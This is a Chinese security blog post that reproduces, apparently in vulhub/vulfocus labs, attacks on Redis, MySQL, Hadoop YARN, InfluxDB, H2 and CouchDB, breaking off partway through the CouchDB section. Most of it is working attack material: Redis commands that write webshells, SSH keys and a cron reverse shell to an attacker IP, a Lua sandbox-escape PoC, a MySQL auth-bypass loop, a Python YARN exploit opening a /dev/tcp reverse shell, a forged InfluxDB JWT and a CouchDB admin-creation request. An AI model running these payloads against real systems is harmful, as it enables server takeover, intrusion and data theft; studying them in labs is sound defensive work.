
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>服务攻防 - m4ao&#39;s blog</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="服务攻防1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击 
数据库安全Redis-未授权访问-RCE一、漏洞简介123Redis因配置不当可以导致未授权访问，被攻击,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="m4ao&#39;s blog" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
    
    
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="服务攻防 - m4ao&#39;s blog"/>
    <meta name="twitter:description" content="服务攻防1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击 
数据库安全Redis-未授权访问-RCE一、漏洞简介123Redis因配置不当可以导致未授权访问，被攻击,"/>
    
    
    
    
    <meta property="og:site_name" content="m4ao&#39;s blog"/>
    <meta property="og:type" content="object"/>
    <meta property="og:title" content="服务攻防 - m4ao&#39;s blog"/>
    <meta property="og:description" content="服务攻防1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击 
数据库安全Redis-未授权访问-RCE一、漏洞简介123Redis因配置不当可以导致未授权访问，被攻击,"/>
    
<link rel="stylesheet" href="/css/diaspora.css">

    <script>window.searchDbPath = "/search.xml";</script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">m4ao&#39;s blog</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">服务攻防</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">服务攻防</h1>
        <div class="stuff">
            <span>八月 03, 2023</span>
            

        </div>
        <div class="content markdown">
            <h1 id="服务攻防"><a href="#服务攻防" class="headerlink" title="服务攻防"></a>服务攻防</h1><p>1、配置不当-未授权访问</p>
<p>2、安全机制-特定安全漏洞</p>
<p>3、安全机制-弱口令爆破攻击 </p>
<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><h3 id="Redis-未授权访问-RCE"><a href="#Redis-未授权访问-RCE" class="headerlink" title="Redis-未授权访问-RCE"></a>Redis-未授权访问-RCE</h3><h5 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　</span><br><span class="line"></span><br><span class="line">        redis默认情况下，会绑定在0.0.0.0:6379,如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh/authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>产生条件</p>
<p>1、redis绑定在0.0.0.0：6379，且没有进行添加防火墙规则避免其他非信任来源IP访问等相关安全策略，直接暴露在公网</p>
<p>2、没有设置密码认证（一般为空），可以免密码远程登陆redis服务</p>
</li>
<li><p>常用命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">config set dir /home.test  ##设置工作目录</span><br><span class="line">config set dbfilename redis.rdb  #设置备份文件名</span><br><span class="line">config get dir   ##检查工作目录是否设置成功</span><br><span class="line">config get dbfilename ##检查备份文件名是否设置成功</span><br><span class="line">save   ##保存，进行一次备份操作</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717112614644.png" alt="image-20230717112614644"></p>
<ul>
<li><p><strong>未授权访问—利用绝对路径写webshell</strong></p>
<p>利用条件：Web 目录权限可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.110.128</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717144425776.png" alt="image-20230717144425776"></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp            #设置WEB写入目录</span><br><span class="line">config set dbfilename 1.php    #设置写入文件名</span><br><span class="line">set test &quot;&lt;?php phpinfo();?&gt;&quot;  #设置写入文件代码</span><br><span class="line">bgsave                         #保存执行</span><br><span class="line">save                           #保存执行</span><br><span class="line">注意：部分没目录权限读写权限               </span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717144916833.png" alt="image-20230717144916833"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717144943138.png" alt="image-20230717144943138"></p>
<ul>
<li><p><strong>利用公私钥认证获得root权限</strong></p>
<p>利用条件：</p>
<ol>
<li><p>Redis 服务使用 ROOT 账号启动</p>
<p>2.服务器开放了 SSH 服务,而且允许使用密钥登录,即可远程写入一个公钥,直接登录远程服务器.</p>
</li>
</ol>
<p>靶机中开启 redis 服务：redis-server &#x2F;etc&#x2F;redis.conf</p>
<p>在靶机中执行 mkdir &#x2F;root&#x2F;.ssh 命令，创建 ssh 公钥存放目录</p>
<p>在攻击机中生成 ssh 公钥和私钥，密码设置为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //.在攻击机生成ssh密钥对，默认存放在/root/.ssh/目录下，私钥为id_rsa,公钥为id_rsa.pub</span><br><span class="line">cd /root/.ssh/</span><br><span class="line"></span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt//.在攻击机进入密钥目录，将公钥写入key.txt方便后续操作</span><br><span class="line"></span><br><span class="line">cat key.txt | redis-cli -h 118.31.57.214 -x set xxx //这一步在攻击机上操作，将1.txt带入redis服务器</span><br><span class="line"></span><br><span class="line">#如法炮制，此处需要确保靶机上/root/.ssh目录存在</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">ssh -i id_rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>



<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717152451629.png" alt="image-20230717152451629"></p>
<p>进入. ssh 目录：cd .ssh&#x2F;，将生成的公钥保存到 test.txt：</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717152544686.png" alt="image-20230717152544686"></p>
</li>
</ul>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717153832608.png" alt="image-20230717153832608"></p>
<ul>
<li><p><strong>写入计划任务获取反弹shell</strong></p>
<p>攻击机无认证登陆redis后，依次输入如下指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#设置redis库文件的写入目录，/var/spool/cron为linux下存放计划任务的默认目录</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">#设置redis写入库文件的文件名，设置为root</span><br><span class="line">config set dbfilename root</span><br><span class="line">#将每分钟一次的计划任务写入上面设置的目录中，让靶机主动连接攻击机，实现反弹shell</span><br><span class="line">#此处的ip为攻击机ip，后面跟上接收反弹shell的端口</span><br><span class="line">set myshell &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/43.139.157.254/6666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#在靶机查看计划任务</span><br><span class="line">crontab -l</span><br><span class="line">#在攻击机上开启对应端口，等待一段时间，即可完成反弹shell</span><br><span class="line">nc -lvvp 7890</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717155327268.png" alt="image-20230717155327268"></p>
</li>
<li><p><strong>RCE 自动化利用脚本-vulfocus</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/redis-rogue-getshell</span><br><span class="line">python3 redis-master.py -r 123.58.224.8 -p 64044 -L 43.139.157.254 -P 6666 -f RedisModulesSDK/exp.so -c &quot;id&quot; </span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717161253134.png" alt="image-20230717161253134"></p>
</li>
<li><p><strong>新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Poc：执行id命令</span><br><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717162505627.png" alt="image-20230717162505627"></p>
</li>
</ul>
<h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><h4 id="Mysql身份认证漏洞复现-CVE-2012-2122"><a href="#Mysql身份认证漏洞复现-CVE-2012-2122" class="headerlink" title="Mysql身份认证漏洞复现(CVE-2012-2122)"></a>Mysql身份认证漏洞复现(CVE-2012-2122)</h4><h5 id="一、漏洞简介-1"><a href="#一、漏洞简介-1" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><p>当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。 也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。</p>
<h5 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h5><p>影响版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</span><br><span class="line">MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</span><br></pre></td></tr></table></figure>

<h5 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -u root --password=bad -h 192.168.110.128 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230716232116202.png" alt="image-20230716232116202"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start  启动msf数据库</span><br><span class="line">msfconsole  进入msf</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump  选择该模块</span><br><span class="line">set rhosts 14.104.1.1  设置目标</span><br><span class="line">set threads 10  设置线程</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230716231834342.png" alt="image-20230716231834342"></p>
<h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><h5 id="一、漏洞简介-2"><a href="#一、漏洞简介-2" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hadoop作为一个分布式计算应用程序框架，种类功能繁多，各种组件安全问题会带来很大的攻击面。Apache Hadoop YARN是Hadoop的核心组件之一，负责将资源分配在Hadoop集群中运行的各种应用程序，并调度要在不同集群节点上执行的任务。(独立出的资源管理框架，负责资源管理和调度)</span><br></pre></td></tr></table></figure>

<p>漏洞产生原因</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">负责对资源进行同一管理调度的 ReasourceManager 组件的UI管理界面开放在 8080/8088 端口，攻击者无需认证即可通过REST API 部署任务来执行任意命令，最终可完全控制集群中所有的机器</span><br></pre></td></tr></table></figure>

<h5 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717000917258.png" alt="image-20230717000917258"></p>
<p>访问8088 端口 </p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717001225817.png" alt="image-20230717001225817"></p>
<h5 id="三、漏洞复现-1"><a href="#三、漏洞复现-1" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h5><p>首先访问（<code>POST</code>请求） <code>/ws/v1/cluster/apps/new-application</code> 获取 <code>application-id</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717001451858.png" alt="image-20230717001451858"></p>
<p>获取到 <code>application-id</code> application_1689523696250_0001 之后，我们访问 <code>/ws/v1/cluster/apps</code> 页面，并且构造 <code>Payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;application-id&quot;: &quot;application_1659336607746_0001&quot;, &quot;application-name&quot;: &quot;getshell&quot;, &quot;am-container-spec&quot;: &#123;&quot;commands&quot;: &#123;&quot;command&quot;: &quot;ping -c 3 qrfr0e.dnslog.cn&quot;&#125;&#125;, &quot;application-type&quot;: &quot;YARN&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>修改 <code>application-id</code> 的值和你要执行的命令 <code>command</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717002403040.png" alt="image-20230717002403040"></p>
<p>exp 反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shell(url,vps_ip,port):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url+&quot;/ws/v1/cluster/apps/new-application&quot;,headers=headers)</span><br><span class="line">    id = response.json()[&quot;application-id&quot;]</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;application-id&#x27;: id,</span><br><span class="line">        &#x27;application-name&#x27;: &#x27;getshell&#x27;,</span><br><span class="line">        &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">            &#x27;commands&#x27;: &#123;</span><br><span class="line">                &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1&#x27;%(vps_ip,port)</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;application-type&#x27;: &#x27;YARN&#x27;&#125;</span><br><span class="line">    exploit = requests.post(url+&quot;/ws/v1/cluster/apps&quot;,headers=headers,json=data)</span><br><span class="line">    print(&quot;[+] 执行完成！&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = input(&quot;url:&quot;)</span><br><span class="line">    vps_ip = input(&quot;vps:&quot;)</span><br><span class="line">    port = input(&quot;port:&quot;)</span><br><span class="line">    shell(url,vps_ip,port)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230717003333417.png" alt="image-20230717003333417"></p>
<h3 id="Influxdb-未授权访问-JWT验证不当"><a href="#Influxdb-未授权访问-JWT验证不当" class="headerlink" title="Influxdb-未授权访问-JWT验证不当"></a><strong>Influxdb-未授权访问-JWT验证不当</strong></h3><h5 id="一、漏洞简介-3"><a href="#一、漏洞简介-3" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InfluxDB是一款著名的时序数据库，其使用jwt作为鉴权方式。</span><br><span class="line"></span><br><span class="line">在其1.7.6版本以前，默认设置jwt的认证密钥shared-secret为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</span><br><span class="line">默认端口 8086</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-1"><a href="#二、漏洞复现-1" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718155649030.png" alt="image-20230718155649030"></p>
<p>借助 <code>https://jwt.io/</code> 来生成jwt token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;exp&quot;: 1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。</p>
<p>最终生成的token</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718160425145.png" alt="image-20230718160425145"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoiMTY4OTg0MDEzOCJ9.Yz18COQHF8RjQ6MyhKmtHt2Cb3Z4r3_3Kv2Gldx_m6c</span><br></pre></td></tr></table></figure>

<p>其中，<code>admin</code>是一个已经存在的用户，<code>exp</code>是一个时间戳，代表着这个token的过期时间，你需要设置为一个未来的时间戳。</p>
<p>发送带有这个jwt token的数据包，可见SQL语句执行成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /query HTTP/1.1</span><br><span class="line">Host: 192.168.110.128:8086</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg5NzU0MzY5fQ.wqUTXYgdOGfOE6hTsOBMws0W1cA6HNsLf3TVQ4-8-4Q</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">db=sample&amp;q=show users</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718162308236.png" alt="image-20230718162308236"></p>
<h3 id="H2database-未授权访问-配置不当"><a href="#H2database-未授权访问-配置不当" class="headerlink" title="H2database-未授权访问-配置不当"></a><strong>H2database-未授权访问-配置不当</strong></h3><h5 id="一、漏洞简介-4"><a href="#一、漏洞简介-4" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">默认端口：20051</span><br><span class="line">H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：默认端口：</span><br><span class="line">spring.h2.console.enabled=true </span><br><span class="line">spring.h2.console.settings.web-allow-others=true</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-2"><a href="#二、漏洞复现-2" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><p>访问<code>http://your-ip:8080/h2-console/</code>即可查看到H2 database的管理页面。</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718222625975.png" alt="image-20230718222625975"></p>
<p>生成执行RMI Payload-URL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 43.139.157.254</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718223442524.png" alt="image-20230718223442524"></p>
<h3 id="CouchDB-权限绕过-配合-RCE-漏洞"><a href="#CouchDB-权限绕过-配合-RCE-漏洞" class="headerlink" title="CouchDB-权限绕过 配合 RCE-漏洞"></a>CouchDB-权限绕过 配合 RCE-漏洞</h3><h5 id="一、漏洞简介-5"><a href="#一、漏洞简介-5" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</span><br><span class="line"></span><br><span class="line">在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</span><br><span class="line"></span><br><span class="line">影响版本：小于 1.7.0 以及 小于 2.1.1</span><br></pre></td></tr></table></figure>

<h5 id="二、漏洞复现-3"><a href="#二、漏洞复现-3" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h5><ul>
<li><p>权限绕过</p>
<p>环境启动后，访问<code>http://your-ip:5984/_utils/</code>即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718225837525.png" alt="image-20230718225837525"></p>
</li>
</ul>
<p>​		首先，发送如下数据包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /_users/org.couchdb.user:vulhub HTTP/<span class="number">1.1</span></span><br><span class="line">Host: your-ip:<span class="number">5984</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">90</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulhub&quot;</span>,</span><br><span class="line">  <span class="string">&quot;roles&quot;</span>: [<span class="string">&quot;_admin&quot;</span>],</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;vulhub&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230718230812636.png" alt="image-20230718230812636"></p>
<p>可见，返回403错误：<code>&#123;&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;&#125;</code>，只有管理员才能设置Role角色：</p>
<p>发送包含两个roles的数据包，即可绕过限制：</p>
